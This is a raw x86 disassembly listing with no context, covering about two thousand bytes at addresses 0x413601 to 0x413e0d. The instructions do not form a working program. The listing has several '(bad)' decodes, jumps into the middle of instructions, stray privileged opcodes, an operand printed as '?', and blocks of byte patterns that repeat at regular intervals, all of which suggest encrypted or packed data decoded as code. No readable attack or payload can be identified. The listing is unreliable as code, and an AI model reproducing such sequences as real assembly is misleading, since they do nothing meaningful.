  413601:	adc    BYTE PTR [ecx+0x41bf233c],dl
  413607:	mov    esp,0x477443c0
  41360c:	outs   dx,DWORD PTR ds:[esi]
  41360d:	rcl    DWORD PTR [eax+0x70],cl
  413610:	inc    eax
  413611:	dec    ecx
  413612:	jle    0x413599
  413614:	neg    BYTE PTR [edi]
  413616:	xor    ebp,eax
  413618:	sub    BYTE PTR [eax+0x5e0343d0],ch
  41361e:	inc    ecx
  41361f:	push   edx
  413620:	inc    eax
  413621:	addr16 push 0x3bf5c590
  413627:	pop    edx
  413628:	sub    al,BYTE PTR [eax+0x41]
  41362b:	inc    ebx
  41362c:	inc    eax
  41362d:	add    eax,0x43406262
  413632:	inc    ecx
  413633:	adc    BYTE PTR [eax],al
  413635:	inc    eax
  413636:	add    eax,0x43000562
  41363b:	add    BYTE PTR [ecx+0x40],al
  41363e:	inc    eax
  41363f:	add    eax,0x400062
  413644:	inc    ebx
  413645:	inc    eax
  413646:	js     0x413689
  413648:	inc    ecx
  413649:	bound  eax,QWORD PTR [eax+0x7d]
  41364c:	stos   DWORD PTR es:[edi],eax
  41364d:	cmc    
  41364e:	aaa    
  41364f:	pop    ebp
  413650:	in     eax,dx
  413651:	mov    esp,0x43bc3310
  413656:	out    0x37,al
  413658:	std    
  413659:	jo     0x413603
  41365b:	mov    ah,0x73
  41365d:	shl    DWORD PTR [ebx+0x5e8d553],1
  413663:	adc    eax,0xd5b42c2f
  413668:	jo     0x4136bc
  41366a:	int    0x7b
  41366c:	dec    eax
  41366d:	cmp    ah,0x53
  413670:	xchg   ecx,eax
  413671:	push   ecx
  413672:	adc    al,BYTE PTR [edx-0x4]
  413675:	fsubr  DWORD PTR [eax-0x21]
  413678:	xor    DWORD PTR [esp+ebx*4+0x62b56a19],edi
  41367f:	inc    eax
  413680:	add    eax,0x40430041
  413685:	inc    eax
  413686:	inc    ecx
  413687:	inc    eax
  413688:	inc    eax
  413689:	bound  eax,QWORD PTR ds:0x5624300
  41368f:	add    BYTE PTR [eax+0x40],al
  413692:	add    BYTE PTR [ecx+0x43],al
  413695:	add    BYTE PTR [eax+0x41],al
  413698:	add    eax,0x40436200
  41369d:	inc    eax
  41369e:	add    eax,0x92534e62
  4136a3:	jo     0x4136ba
  4136a5:	loopne 0x4136e8
  4136a7:	inc    ecx
  4136a8:	mov    al,0xdf
  4136aa:	sub    ch,al
  4136ac:	int    0x64
  4136ae:	cmp    al,0x43
  4136b0:	fwait
  4136b1:	push   edx
  4136b2:	inc    eax
  4136b3:	push   edx
  4136b4:	dec    ebx
  4136b5:	inc    ecx
  4136b6:	js     0x4136e8
  4136b8:	int3   
  4136b9:	icebp  
  4136ba:	das    
  4136bb:	dec    eax
  4136bc:	aam    0xfc
  4136be:	inc    esp
  4136bf:	cmp    BYTE PTR [ebx-0x3343f4b1],cl
  4136c5:	jno    0x413709
  4136c7:	inc    edi
  4136c8:	pop    edi
  4136c9:	jae    0x4136dd
  4136cb:	jo     0x413730
  4136cd:	push   edx
  4136ce:	mov    ebp,0x32bf3b85
  4136d3:	call   0x40827b59
  4136d8:	add    eax,0x41624340
  4136dd:	test   BYTE PTR [eax],al
  4136df:	and    eax,0x404043
  4136e4:	add    BYTE PTR ds:0x626210,al
  4136ea:	add    eax,0x43404140
  4136ef:	inc    eax
  4136f0:	inc    ecx
  4136f1:	add    eax,0x10664062
  4136f6:	inc    ebx
  4136f7:	bound  ebp,QWORD PTR [ebp+0x43]
  4136fa:	xor    BYTE PTR [ecx],dl
  4136fc:	mov    ds:0xcf249c52,al
  413701:	nop
  413702:	pop    esp
  413703:	xchg   ebx,eax
  413704:	stc    
  413705:	vpunpckhbw xmm6,xmm0,XMMWORD PTR [edx+edx*4+0x79b26a77]
  41370e:	aam    0x17
  413710:	bound  eax,QWORD PTR [ebx+0x1f]
  413713:	push   ecx
  413714:	outs   dx,BYTE PTR ds:[esi]
  413715:	test   DWORD PTR [ebx+0x5d17234],edx
  41371b:	inc    edx
  41371c:	inc    eax
  41371d:	push   ebp
  41371e:	ds loopne 0x413709
  413721:	dec    ebx
  413722:	stos   BYTE PTR es:[edi],al
  413723:	adc    DWORD PTR [edx+0x70],edx
  413726:	xor    eax,0xad943ebe
  41372b:	jo     0x413764
  41372d:	call   0x420d3cc3
  413732:	inc    eax
  413733:	add    BYTE PTR [eax],al
  413735:	add    BYTE PTR [eax+0x40],al
  413738:	inc    ebx
  413739:	bound  eax,QWORD PTR [eax]
  41373b:	inc    eax
  41373c:	inc    eax
  41373d:	add    eax,0x62434162
  413742:	inc    eax
  413743:	js     0x413755
  413745:	inc    ecx
  413746:	add    eax,0x5404325
  41374b:	bound  eax,QWORD PTR [eax+0x40]
  41374e:	inc    ecx
  41374f:	inc    ebx
  413750:	rol    DWORD PTR [ecx+0x44],0x3f
  413754:	jp     0x413753
  413756:	push   edx
  413757:	dec    edx
  413758:	aam    0x3d
  41375a:	out    0x32,eax
  41375c:	cs pop ds
  41375e:	aad    0xc5
  413760:	fisub  DWORD PTR [ecx+eax*2+0x60]
  413764:	push   ebx
  413765:	jnp    0x41379d
  413767:	enter  0x6065,0x43
  41376b:	xor    al,0x39
  41376d:	jno    0x413778
  41376f:	dec    edx
  413770:	fldenv [eax+esi*1]
  413773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413774:	adc    dl,BYTE PTR [esp+eiz*2]
  413777:	and    eax,0x35344161
  41377c:	aas    
  41377d:	mov    bh,0xfa
  41377f:	sub    DWORD PTR [ebp+edi*1+0x25],edi
  413783:	inc    ecx
  413784:	bound  eax,QWORD PTR [ebx+0x0]
  413787:	adc    BYTE PTR [eax+0x0],al
  41378a:	add    eax,0x62410040
  41378f:	inc    eax
  413790:	add    BYTE PTR [ebx-0x34],al
  413793:	inc    eax
  413794:	add    eax,0x78434040
  413799:	bound  eax,QWORD PTR [ecx+0x78]
  41379c:	add    eax,0x62404043
  4137a1:	inc    edi
  4137a2:	sub    BYTE PTR [eax],bl
  4137a4:	sub    al,0x70
  4137a6:	test   al,0x66
  4137a8:	je     0x41372f
  4137aa:	retf   0x99b3
  4137ad:	jmp    0x60657a12
  4137b2:	pop    ds
  4137b3:	mov    bh,0xef
  4137b5:	push   edx
  4137b6:	cs cmp al,0x0
  4137b9:	lock out dx,eax
  4137bb:	aas    
  4137bc:	add    ebp,DWORD PTR [edx+edx*1+0x55]
  4137c0:	push   edx
  4137c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137c2:	pop    es
  4137c3:	lahf   
  4137c4:	jno    0x413782
  4137c6:	push   eax
  4137c7:	pusha  
  4137c8:	inc    ecx
  4137c9:	scas   eax,DWORD PTR es:[edi]
  4137ca:	mul    BYTE PTR [eax-0x70]
  4137cd:	jo     0x41377c
  4137cf:	fiadd  WORD PTR [ecx+0x40]
  4137d2:	add    eax,0x43436240
  4137d7:	add    eax,0x62004040
  4137dc:	inc    eax
  4137dd:	add    BYTE PTR [ecx+0x40],al
  4137e0:	inc    ebx
  4137e1:	test   BYTE PTR ds:0x58054041,ah
  4137e7:	inc    eax
  4137e8:	inc    eax
  4137e9:	bound  eax,QWORD PTR [eax+0x66]
  4137ec:	inc    ecx
  4137ed:	inc    eax
  4137ee:	add    eax,0x5d433c00
  4137f3:	mov    cl,0x53
  4137f5:	call   0xd28e7a38
  4137fa:	repz dec esp
  4137fc:	dec    ecx
  4137fd:	push   edx
  4137fe:	adc    DWORD PTR ds:0x5426bf60,edi
  413804:	rol    ebp,1
  413806:	mov    ah,0x54
  413808:	inc    ecx
  413809:	inc    eax
  41380a:	call   0xdc60:0xd0b030c
  413811:	icebp  
  413812:	test   BYTE PTR [eax-0x69],0xc1
  413816:	retf   
  413817:	outs   dx,DWORD PTR fs:[esi]
  413819:	mov    dh,0x87
  41381b:	push   ebp
  41381c:	or     al,0x65
  41381e:	inc    ecx
  41381f:	inc    edx
  413820:	add    BYTE PTR [eax],al
  413822:	inc    ebx
  413823:	inc    eax
  413824:	bound  eax,QWORD PTR ds:0x25404110
  41382a:	add    ah,cl
  41382c:	inc    ebx
  41382d:	add    eax,0x40402562
  413832:	add    BYTE PTR [eax+0x40],al
  413835:	inc    ecx
  413836:	inc    ecx
  413837:	add    eax,0x78434025
  41383c:	bound  eax,QWORD PTR [eax-0x7c]
  41383f:	inc    eax
  413840:	inc    ecx
  413841:	adc    eax,DWORD PTR [ecx+0x4b]
  413844:	push   ecx
  413845:	xchg   edi,eax
  413846:	jo     0x4138b4
  413848:	cmp    eax,0x3f4743ec
  41384d:	inc    eax
  41384e:	call   0x30c5ab3b
  413853:	adc    al,bl
  413855:	xor    DWORD PTR [edx+0x62],edx
  413858:	sbb    DWORD PTR [eax+0x419a6c30],ebp
  41385e:	inc    eax
  41385f:	inc    eax
  413860:	inc    ebx
  413861:	int3   
  413862:	add    BYTE PTR ds:0x56240,al
  413868:	inc    ebx
  413869:	inc    eax
  41386a:	inc    eax
  41386b:	add    BYTE PTR [ecx+0x62],al
  41386e:	bound  eax,QWORD PTR [eax]
  413870:	int3   
  413871:	inc    eax
  413872:	inc    ebx
  413873:	add    eax,0x43624041
  413878:	adc    BYTE PTR [ecx+0x5],al
  41387b:	inc    eax
  41387c:	clc    
  41387d:	or     eax,0x47104212
  413882:	xchg   ebx,eax
  413883:	xor    al,0xb1
  413885:	mov    ah,0xa0
  413887:	cmp    eax,0xaea78526
  41388c:	popa   
  41388d:	jo     0x4138a4
  41388f:	inc    edx
  413890:	and    eax,DWORD PTR [ebx+0x3d]
  413893:	bound  eax,QWORD PTR [ebx+0x40]
  413896:	adc    BYTE PTR ds:0x4158cc40,al
  41389c:	inc    ebx
  41389d:	bound  eax,QWORD PTR [ecx+0x40]
  4138a0:	add    eax,0x4140
  4138a5:	and    eax,0x40400062
  4138aa:	add    eax,0x84404340
  4138af:	int3   
  4138b0:	js     0x4138b2
  4138b2:	inc    ecx
  4138b3:	adc    BYTE PTR [edx+0xf],ah
  4138b6:	push   esi
  4138b7:	je     0x4138a1
  4138b9:	int    0x60
  4138bb:	leave  
  4138bc:	nop
  4138bd:	rcl    DWORD PTR [edx+0x421152bf],1
  4138c3:	push   ecx
  4138c4:	dec    esp
  4138c5:	or     eax,0xa4633732
  4138ca:	enter  0x43cb,0xc3
  4138ce:	enter  0xbc7f,0xd
  4138d2:	jae    0x413890
  4138d4:	shr    DWORD PTR [eax-0x328feecc],1
  4138da:	mov    esp,0x972f041
  4138df:	push   ecx
  4138e0:	call   0x408278e5
  4138e5:	inc    ebx
  4138e6:	bound  ax,DWORD PTR ds:0x40434100
  4138ed:	add    eax,0x40054062
  4138f2:	bound  eax,QWORD PTR [ecx+0x40]
  4138f5:	inc    ebx
  4138f6:	inc    eax
  4138f7:	add    eax,0x25405841
  4138fc:	bound  eax,QWORD PTR [eax+0x43]
  4138ff:	inc    eax
  413900:	adc    BYTE PTR [eax-0x20],al
  413903:	xor    ecx,ebp
  413905:	test   BYTE PTR [eax+0x30],0x52
  413909:	inc    eax
  41390a:	arpl   WORD PTR [edi*8-0x3a929f35],dx
  413911:	inc    ecx
  413912:	mov    edi,0x713c7a63
  413917:	aad    0x7e
  413919:	dec    esi
  41391a:	nop
  41391b:	pop    ebp
  41391c:	inc    ecx
  41391d:	shl    edx,0x92
  413920:	mov    ebp,0x40434140
  413925:	add    eax,0x43406262
  41392a:	inc    ecx
  41392b:	adc    BYTE PTR [eax],al
  41392d:	inc    eax
  41392e:	add    eax,0x43000562
  413933:	add    BYTE PTR [ecx+0x40],al
  413936:	inc    eax
  413937:	add    eax,0x400062
  41393c:	inc    ebx
  41393d:	inc    eax
  41393e:	js     0x413981
  413940:	inc    ecx
  413941:	bound  eax,QWORD PTR [eax-0x3c]
  413944:	arpl   WORD PTR [eax],bp
  413946:	inc    ebx
  413947:	sub    DWORD PTR ds:0x904f5514,esp
  41394d:	xor    DWORD PTR [eax],esi
  41394f:	in     al,dx
  413950:	loop   0x413996
  413952:	jo     0x41399f
  413954:	stos   DWORD PTR es:[edi],eax
  413955:	bound  ebp,QWORD PTR [edi+ecx*1]
  413958:	dec    ecx
  413959:	xor    eax,0x41054062
  41395e:	add    BYTE PTR [ebx+0x40],al
  413961:	inc    eax
  413962:	inc    ecx
  413963:	inc    eax
  413964:	inc    eax
  413965:	bound  eax,QWORD PTR ds:0x5624300
  41396b:	add    BYTE PTR [eax+0x40],al
  41396e:	add    BYTE PTR [ecx+0x43],al
  413971:	add    BYTE PTR [eax+0x41],al
  413974:	add    eax,0x40436200
  413979:	inc    eax
  41397a:	add    eax,0xa6de862
  41397f:	test   BYTE PTR [edi+0x2a],al
  413982:	xor    eax,DWORD PTR [edi]
  413984:	push   edx
  413985:	fadd   QWORD PTR [ebx+eax*8-0x7b]
  413989:	mov    ecx,0x6523b53a
  41398e:	leave  
  41398f:	and    al,0x43
  413991:	push   ebx
  413992:	mov    ch,0x2b
  413994:	mov    al,ds:0x90262653
  413999:	adc    al,dh
  41399b:	inc    ecx
  41399c:	jo     0x41396a
  41399e:	mov    ah,0x52
  4139a0:	imul   edi,DWORD PTR [ebx+0x33e850f4],0x5404144
  4139aa:	inc    eax
  4139ab:	inc    ebx
  4139ac:	bound  eax,QWORD PTR [ecx-0x7c]
  4139af:	add    BYTE PTR ds:0x404043,ah
  4139b5:	add    BYTE PTR ds:0x626210,al
  4139bb:	add    eax,0x43404140
  4139c0:	inc    eax
  4139c1:	inc    ecx
  4139c2:	add    eax,0x10664062
  4139c7:	inc    ebx
  4139c8:	bound  eax,QWORD PTR [esi+0x43]
  4139cb:	aam    0x2e
  4139cd:	or     al,0x52
  4139cf:	cwde   
  4139d0:	inc    edx
  4139d1:	ins    BYTE PTR es:[edi],dx
  4139d2:	ror    DWORD PTR [esi-0x5732acb7],1
  4139d8:	enter  0x469,0xf6
  4139dc:	adc    dl,BYTE PTR [edi+0x3e441034]
  4139e2:	cmp    eax,0xf1493950
  4139e7:	mov    esp,0x54820a3
  4139ec:	int3   
  4139ed:	inc    ecx
  4139ee:	inc    eax
  4139ef:	add    BYTE PTR [eax],al
  4139f1:	add    BYTE PTR [eax+0x40],al
  4139f4:	inc    ebx
  4139f5:	bound  eax,QWORD PTR [eax]
  4139f7:	inc    eax
  4139f8:	inc    eax
  4139f9:	add    eax,0x62434162
  4139fe:	inc    eax
  4139ff:	js     0x413a11
  413a01:	inc    ecx
  413a02:	add    eax,0x5404325
  413a07:	bound  eax,QWORD PTR [eax+0x40]
  413a0a:	inc    ecx
  413a0b:	inc    ebx
  413a0c:	xchg   edx,eax
  413a0d:	add    eax,0x39426453
  413a12:	pop    esp
  413a13:	sub    esp,DWORD PTR [eax+0x2b565e31]
  413a19:	dec    eax
  413a1a:	mov    WORD PTR [ecx-0x6c],es
  413a1d:	jno    0x413a94
  413a1f:	sub    al,0xc0
  413a21:	and    eax,0x436241
  413a26:	adc    BYTE PTR [eax+0x0],al
  413a29:	add    eax,0x62410040
  413a2e:	inc    eax
  413a2f:	add    BYTE PTR [ebx-0x34],al
  413a32:	inc    eax
  413a33:	add    eax,0x78434040
  413a38:	bound  eax,QWORD PTR [ecx+0x78]
  413a3b:	add    eax,0x62404043
  413a40:	mov    es,WORD PTR [ecx]
  413a42:	inc    ebx
  413a43:	add    DWORD PTR [edi],esi
  413a45:	add    al,ah
  413a47:	addr16 test al,0x4f
  413a4a:	xor    ch,ah
  413a4c:	stos   DWORD PTR es:[edi],eax
  413a4d:	rcr    DWORD PTR [edx-0x3c],1
  413a50:	adc    BYTE PTR [ebp+0x7f0ba728],dh
  413a56:	mov    ebp,0x474c0a4f
  413a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a5c:	adc    DWORD PTR [ebp+0x9],esi
  413a5f:	inc    eax
  413a60:	inc    esp
  413a61:	mov    esp,0x46449785
  413a66:	and    al,0xbc
  413a68:	imul   DWORD PTR [ebp+0x43]
  413a6b:	or     cl,dl
  413a6d:	aaa    
  413a6e:	push   edx
  413a6f:	inc    edx
  413a70:	dec    edi
  413a71:	dec    ebx
  413a72:	nop
  413a73:	mov    WORD PTR [ebx-0x1],?
  413a76:	aad    0x41
  413a78:	inc    eax
  413a79:	add    eax,0x43436240
  413a7e:	add    eax,0x62004040
  413a83:	inc    eax
  413a84:	add    BYTE PTR [ecx+0x40],al
  413a87:	inc    ebx
  413a88:	test   BYTE PTR ds:0x58054041,ah
  413a8e:	inc    eax
  413a8f:	inc    eax
  413a90:	bound  eax,QWORD PTR [eax+0x66]
  413a93:	inc    ecx
  413a94:	inc    eax
  413a95:	add    eax,0x44487b00
  413a9a:	push   es
  413a9b:	mov    esi,0xd8376752
  413aa0:	adc    eax,0x2df7436f
  413aa5:	adc    ch,cl
  413aa7:	arpl   WORD PTR [edi+0x73],ax
  413aaa:	shr    ebx,1
  413aac:	inc    ebp
  413aad:	es cli 
  413aaf:	jno    0x413b13
  413ab1:	in     al,dx
  413ab2:	mov    ch,0x18
  413ab4:	mov    al,0x5c
  413ab6:	or     esp,eax
  413ab8:	and    BYTE PTR [esi-0xf],ah
  413abb:	push   esi
  413abc:	neg    DWORD PTR cs:[ecx]
  413abf:	add    BYTE PTR [eax],al
  413ac1:	inc    ebx
  413ac2:	inc    eax
  413ac3:	bound  eax,QWORD PTR ds:0x25404110
  413ac9:	add    ah,cl
  413acb:	inc    ebx
  413acc:	add    eax,0x40402562
  413ad1:	add    BYTE PTR [eax+0x40],al
  413ad4:	inc    ecx
  413ad5:	inc    ecx
  413ad6:	add    eax,0x78434025
  413adb:	bound  eax,QWORD PTR [eax-0x7c]
  413ade:	inc    eax
  413adf:	inc    ecx
  413ae0:	dec    edi
  413ae1:	bound  ecx,QWORD PTR [edx-0x10]
  413ae4:	xchg   esp,eax
  413ae5:	jg     0x413b37
  413ae7:	push   edx
  413ae8:	jo     0x413b49
  413aea:	leave  
  413aeb:	icebp  
  413aec:	xchg   bl,dl
  413aee:	fxch   st(5)
  413af0:	add    edi,DWORD PTR ds:0x46c5414c
  413af6:	push   ecx
  413af7:	and    DWORD PTR [edx-0x48],esp
  413afa:	adc    eax,0xb111b243
  413aff:	icebp  
  413b00:	rcr    DWORD PTR [esi-0x35],cl
  413b03:	xor    BYTE PTR [edi-0x55],bh
  413b06:	inc    edx
  413b07:	stc    
  413b08:	sbb    BYTE PTR [edi+0x43404041],ah
  413b0e:	int3   
  413b0f:	add    BYTE PTR ds:0x56240,al
  413b15:	inc    ebx
  413b16:	inc    eax
  413b17:	inc    eax
  413b18:	add    BYTE PTR [ecx+0x62],al
  413b1b:	bound  eax,QWORD PTR [eax]
  413b1d:	int3   
  413b1e:	inc    eax
  413b1f:	inc    ebx
  413b20:	add    eax,0x43624041
  413b25:	adc    BYTE PTR [ecx+0x5],al
  413b28:	inc    eax
  413b29:	inc    edx
  413b2a:	and    al,0xc6
  413b2c:	inc    esi
  413b2d:	ror    DWORD PTR [ecx],1
  413b2f:	bound  edx,QWORD PTR [ebx+0x75]
  413b32:	inc    edi
  413b33:	add    ebp,edx
  413b35:	push   ebp
  413b36:	sbb    DWORD PTR [eax+ebp*2+0x3c],esp
  413b3a:	test   DWORD PTR [ebp+0x205211d5],edi
  413b40:	mov    BYTE PTR [edi+0x43],al
  413b43:	and    al,0x51
  413b45:	cmp    ebp,eax
  413b47:	imul   ebx,DWORD PTR [edx],0x765e903c
  413b4d:	bound  eax,QWORD PTR [ebx+0x40]
  413b50:	adc    BYTE PTR ds:0x4158cc40,al
  413b56:	inc    ebx
  413b57:	bound  eax,QWORD PTR [ecx+0x40]
  413b5a:	add    eax,0x4140
  413b5f:	and    eax,0x40400062
  413b64:	add    eax,0x84404340
  413b69:	int3   
  413b6a:	js     0x413b6c
  413b6c:	inc    ecx
  413b6d:	adc    BYTE PTR [edx+0xf],ah
  413b70:	adc    ecx,DWORD PTR [edx]
  413b72:	sti    
  413b73:	hlt    
  413b74:	push   ecx
  413b75:	and    esp,DWORD PTR [edi-0x578200eb]
  413b7b:	(bad)  
  413b7c:	lds    eax,FWORD PTR [ebx-0x45]
  413b7f:	dec    ebx
  413b80:	push   esi
  413b81:	adc    DWORD PTR gs:[edx+0x29],ebp
  413b85:	rcr    DWORD PTR [eax+0x4c09f03d],1
  413b8b:	mov    WORD PTR [ecx+eax*2+0x29],ss
  413b8f:	xor    DWORD PTR [edi],esp
  413b91:	sbb    BYTE PTR [edx+0x8],al
  413b94:	inc    ebp
  413b95:	add    BYTE PTR [eax+0x41],al
  413b98:	inc    eax
  413b99:	inc    ebx
  413b9a:	bound  ax,DWORD PTR ds:0x40434100
  413ba1:	add    eax,0x40054062
  413ba6:	bound  eax,QWORD PTR [ecx+0x40]
  413ba9:	inc    ebx
  413baa:	inc    eax
  413bab:	add    eax,0x25405841
  413bb0:	bound  eax,QWORD PTR [eax+0x43]
  413bb3:	inc    eax
  413bb4:	adc    BYTE PTR ds:0x524e75a0,ah
  413bba:	je     0x413bf0
  413bbc:	in     eax,0x45
  413bbe:	mov    ecx,DWORD PTR [edx]
  413bc0:	mov    cl,0xd5
  413bc2:	adc    BYTE PTR [edi+0x67],cl
  413bc5:	mov    al,ds:0xa66770e
  413bca:	inc    eax
  413bcb:	inc    ecx
  413bcc:	inc    ebx
  413bcd:	inc    eax
  413bce:	add    eax,0x43406262
  413bd3:	inc    ecx
  413bd4:	adc    BYTE PTR [eax],al
  413bd6:	inc    eax
  413bd7:	add    eax,0x43000562
  413bdc:	add    BYTE PTR [ecx+0x40],al
  413bdf:	inc    eax
  413be0:	add    eax,0x400062
  413be5:	inc    ebx
  413be6:	inc    eax
  413be7:	js     0x413c2a
  413be9:	inc    ecx
  413bea:	bound  eax,QWORD PTR [eax+0x62]
  413bed:	imul   bh
  413bef:	inc    ecx
  413bf0:	into   
  413bf1:	xor    BYTE PTR [ebx],dl
  413bf3:	shr    edx,1
  413bf5:	imul   esp,DWORD PTR [ebx],0x43
  413bf8:	sbb    BYTE PTR [ecx-0x7bdb9b95],bl
  413bfe:	test   al,0x30
  413c00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c01:	bound  eax,QWORD PTR [eax+0x5]
  413c04:	inc    ecx
  413c05:	add    BYTE PTR [ebx+0x40],al
  413c08:	inc    eax
  413c09:	inc    ecx
  413c0a:	inc    eax
  413c0b:	inc    eax
  413c0c:	bound  eax,QWORD PTR ds:0x5624300
  413c12:	add    BYTE PTR [eax+0x40],al
  413c15:	add    BYTE PTR [ecx+0x43],al
  413c18:	add    BYTE PTR [eax+0x41],al
  413c1b:	add    eax,0x40436200
  413c20:	inc    eax
  413c21:	add    eax,0x4d790562
  413c26:	jmp    0x961b47e
  413c2b:	jno    0x413ca5
  413c2d:	sub    al,0xdc
  413c2f:	fst    QWORD PTR [ebx]
  413c31:	inc    edi
  413c32:	lods   eax,DWORD PTR ds:[esi]
  413c33:	mov    edi,0x1dd3d653
  413c38:	fs inc ecx
  413c3a:	inc    eax
  413c3b:	add    eax,0x41624340
  413c40:	test   BYTE PTR [eax],al
  413c42:	and    eax,0x404043
  413c47:	add    BYTE PTR ds:0x626210,al
  413c4d:	add    eax,0x43404140
  413c52:	inc    eax
  413c53:	inc    ecx
  413c54:	add    eax,0x10664062
  413c59:	inc    ebx
  413c5a:	bound  eax,QWORD PTR [ebp-0x322493e2]
  413c60:	pop    esp
  413c61:	xor    al,0x6d
  413c63:	inc    ebx
  413c64:	retf   0xd2f7
  413c67:	enter  0x8b63,0xe4
  413c6b:	nop
  413c6c:	ror    BYTE PTR [edx+0x7],1
  413c6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c70:	(bad)  
  413c71:	into   
  413c72:	jb     0x413c34
  413c74:	add    eax,0x4041cc
  413c79:	add    BYTE PTR [eax],al
  413c7b:	inc    eax
  413c7c:	inc    eax
  413c7d:	inc    ebx
  413c7e:	bound  eax,QWORD PTR [eax]
  413c80:	inc    eax
  413c81:	inc    eax
  413c82:	add    eax,0x62434162
  413c87:	inc    eax
  413c88:	js     0x413c9a
  413c8a:	inc    ecx
  413c8b:	add    eax,0x5404325
  413c90:	bound  eax,QWORD PTR [eax+0x40]
  413c93:	inc    ecx
  413c94:	inc    ebx
  413c95:	xor    al,0x53
  413c97:	(bad)  
  413c98:	gs and dl,bl
  413c9b:	dec    ebx
  413c9c:	inc    ebx
  413c9d:	pop    ss
  413c9e:	xor    BYTE PTR [ebp+0x9],bl
  413ca1:	les    edx,FWORD PTR [eax-0x66642eb7]
  413ca7:	icebp  
  413ca8:	sbb    ah,ch
  413caa:	push   edx
  413cab:	addr16 jbe 0x413d18
  413cae:	jle    0x413cc6
  413cb0:	push   edx
  413cb1:	arpl   WORD PTR [esi],bx
  413cb3:	js     0x413c90
  413cb5:	and    eax,0x436241
  413cba:	adc    BYTE PTR [eax+0x0],al
  413cbd:	add    eax,0x62410040
  413cc2:	inc    eax
  413cc3:	add    BYTE PTR [ebx-0x34],al
  413cc6:	inc    eax
  413cc7:	add    eax,0x78434040
  413ccc:	bound  eax,QWORD PTR [ecx+0x78]
  413ccf:	add    eax,0x62404043
  413cd4:	stos   BYTE PTR es:[edi],al
  413cd5:	mov    ebp,0x2c05c533
  413cda:	cmp    al,0x50
  413cdc:	jae    0x413d5c
  413cde:	(bad)  
  413cdf:	les    eax,FWORD PTR [edi+0xee563b9]
  413ce5:	mov    edi,0x53a19593
  413cea:	add    BYTE PTR [ecx-0x37],0xc1
  413cee:	and    DWORD PTR [ebp-0x7e],esp
  413cf1:	(bad)  [eax+0x33ff4043]
  413cf7:	or     DWORD PTR [ebp+esi*1+0x2],ecx
  413cfb:	xor    BYTE PTR [eax+0x40],al
  413cfe:	into   
  413cff:	sbb    BYTE PTR [eax+0x411cde42],dl
  413d05:	inc    eax
  413d06:	add    eax,0x43436240
  413d0b:	add    eax,0x62004040
  413d10:	inc    eax
  413d11:	add    BYTE PTR [ecx+0x40],al
  413d14:	inc    ebx
  413d15:	test   BYTE PTR ds:0x58054041,ah
  413d1b:	inc    eax
  413d1c:	inc    eax
  413d1d:	bound  eax,QWORD PTR [eax+0x66]
  413d20:	inc    ecx
  413d21:	inc    eax
  413d22:	add    eax,0xf3524000
  413d27:	push   edx
  413d28:	push   0x447623d
  413d2d:	push   ebp
  413d2e:	dec    ebp
  413d2f:	aad    0x36
  413d31:	jnp    0x413d3a
  413d33:	test   DWORD PTR [eax+0x1f],eax
  413d36:	mov    cl,0x28
  413d38:	test   eax,0x40433442
  413d3d:	mov    edi,0xc8b0f54d
  413d42:	jno    0x413cd4
  413d44:	inc    eax
  413d45:	dec    ecx
  413d46:	mov    edi,0x2ffa
  413d4b:	inc    ebx
  413d4c:	inc    eax
  413d4d:	bound  eax,QWORD PTR ds:0x25404110
  413d53:	add    ah,cl
  413d55:	inc    ebx
  413d56:	add    eax,0x40402562
  413d5b:	add    BYTE PTR [eax+0x40],al
  413d5e:	inc    ecx
  413d5f:	inc    ecx
  413d60:	add    eax,0x78434025
  413d65:	bound  eax,QWORD PTR [eax-0x7c]
  413d68:	inc    eax
  413d69:	inc    ecx
  413d6a:	ins    DWORD PTR es:[edi],dx
  413d6b:	pop    edx
  413d6c:	fisttp QWORD PTR [ecx+eiz*2]
  413d6f:	dec    edx
  413d70:	or     ebx,edx
  413d72:	bound  eax,QWORD PTR ss:[ebx+0x40]
  413d76:	adc    edx,DWORD PTR [ebp+0x438c5819]
  413d7c:	rcl    DWORD PTR [edx],1
  413d7e:	inc    ecx
  413d7f:	mov    edi,0x4862c752
  413d84:	add    BYTE PTR [ecx+0x40],0x40
  413d88:	inc    ebx
  413d89:	int3   
  413d8a:	add    BYTE PTR ds:0x56240,al
  413d90:	inc    ebx
  413d91:	inc    eax
  413d92:	inc    eax
  413d93:	add    BYTE PTR [ecx+0x62],al
  413d96:	bound  eax,QWORD PTR [eax]
  413d98:	int3   
  413d99:	inc    eax
  413d9a:	inc    ebx
  413d9b:	add    eax,0x43624041
  413da0:	adc    BYTE PTR [ecx+0x5],al
  413da3:	inc    eax
  413da4:	inc    eax
  413da5:	adc    DWORD PTR [esi-0x33],ebp
  413da8:	add    eax,0x150f0d2b
  413dad:	enter  0x629b,0x63
  413db1:	test   BYTE PTR [ebp-0x1b],ch
  413db4:	inc    eax
  413db5:	xchg   ebx,eax
  413db6:	inc    edx
  413db7:	fst    QWORD PTR [ebx+eiz*2+0x3f]
  413dbb:	mov    ah,0x6e
  413dbd:	cmp    al,0xd3
  413dbf:	fs out dx,eax
  413dc1:	(bad)  
  413dc2:	pop    ss
  413dc3:	inc    ecx
  413dc4:	inc    eax
  413dc5:	push   ecx
  413dc6:	inc    ebx
  413dc7:	stc    
  413dc8:	int    0xc0
  413dca:	stos   DWORD PTR es:[edi],eax
  413dcb:	inc    ebx
  413dcc:	push   cs
  413dcd:	jg     0x413e40
  413dcf:	or     DWORD PTR [edx+0x43],esp
  413dd2:	inc    eax
  413dd3:	adc    BYTE PTR ds:0x4158cc40,al
  413dd9:	inc    ebx
  413dda:	bound  eax,QWORD PTR [ecx+0x40]
  413ddd:	add    eax,0x4140
  413de2:	and    eax,0x40400062
  413de7:	add    eax,0x84404340
  413dec:	int3   
  413ded:	js     0x413def
  413def:	inc    ecx
  413df0:	adc    BYTE PTR [edx+0xf],ah
  413df3:	push   eax
  413df4:	push   0x734030b8
  413df9:	inc    eax
  413dfa:	sbb    DWORD PTR ds:0xf18ea93,edi
  413e00:	inc    edx
  413e01:	adc    dl,BYTE PTR [edx-0x3d]
  413e04:	stos   DWORD PTR es:[edi],eax
  413e05:	daa    
  413e06:	inc    edi
  413e07:	inc    eax
  413e08:	ror    DWORD PTR [ecx],1
  413e0a:	lds    eax,FWORD PTR [eax]
  413e0c:	inc    eax
  413e0d:	inc    ecx
